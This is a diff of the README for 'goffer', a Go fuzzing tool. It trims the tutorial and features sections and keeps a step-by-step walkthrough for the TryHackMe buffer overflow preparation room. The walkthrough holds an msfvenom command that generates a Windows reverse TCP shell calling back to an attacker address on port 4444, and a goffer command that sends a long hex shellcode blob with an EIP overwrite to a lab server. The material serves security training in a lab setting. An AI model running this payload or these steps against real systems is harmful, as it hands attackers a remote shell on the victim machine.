@@ -5,21 +5,8 @@ A powerful tool for fuzzing web applications, in a fast concurent fashion. Writt
 1. Install Go.
 2. `go get github.com/souvikhaldar/goffer`
 
-# Tutorial
-[Tutorial YouTube link](https://youtu.be/byxOVwWImuc)
 
-# Features
-1. Fuzzing 
-   Fuzzing a program named `OVERFLOW1` server on machine `10.10.85.251` running on port 1337   
-   
-   ![image](https://user-images.githubusercontent.com/20991754/121797386-7bfa3a80-cc3d-11eb-865c-e46db0a85e82.png)  
-   
-   You can pass `-s` to increase the number of concurrently running goroutines, by default it is 1. It is advised to keep it low because it depends on the threading capability of the target server.
-   
-2. Find the starting address of the EIP (which is mostly the goal) by send sending random string as payload of length 2000 and putting the value of EIP as noticed on the Immunity debugger:
-![image](https://user-images.githubusercontent.com/20991754/121891735-784bde00-cd39-11eb-9b5b-9610b3651609.png)
-
-# Solution steps for tryhackme buffer overflow prepation room:
+# Steps for tryhackme buffer overflow prepation room:
 
 [Youtube link for below steps](https://youtu.be/5PGSRBpxeko)  
 1. Set working directory in immunity: !mona config -set workingfolder c:\mona\%p  
@@ -38,3 +25,6 @@ Eg.
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.249 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f hex
 then use the following goffer command to set this shellcode into the stack and place the JMP ESP instruction's address in the EIP (eg.):
 goffer send -i 10.10.101.55 -p 1337 -c "OVERFLOW1 " -a 1978 --eip af115062 --esp 90909090909090909090909090dadcd97424f45ab811464c5131c9b15283eafc314213035355aea4afb1ac474f42d1ceaa73d1b5bf24e1beedc88a93055afe3b2aebb51d05ece65e046ef5b2e64f36c7e7882b2ab541279929e57d22c2b59022370d9203e605cd8309c9658a110e4344aae43f577a35bff443f93204843ead73fc3c50843b3e8e01df9845b13b188924c8166622963a79e7ad47f20661ce402da58a134cfc76f5711ed9aad755f4bf6534910c44c6611bdfb553844b51d84d52a61f642238de87531125d303098c5cc8c931895f999d6220495ed3c883510ce8acbb2583572c405d54553c5f5ab4e1d6bcdc09bf1749b39ae3e83c318e2bb6b66fe53fb26392cf89d935cf2775d942ac85947e7bd2f1b172b6efe82ca4ed6d166c2a4e996dbfeabd7d79f2f929d5a55787931f16714af3f0150b3fc363146ab58ba5c380b40a8404cd7634ea043354098c4efd9445f36027b0309da430c95ab431cc2772aabc3817cc133832
+
+# Steps for solving vulnserver with goffer
+[Using Goffer for hacking vulnserver](https://youtu.be/byxOVwWImuc)
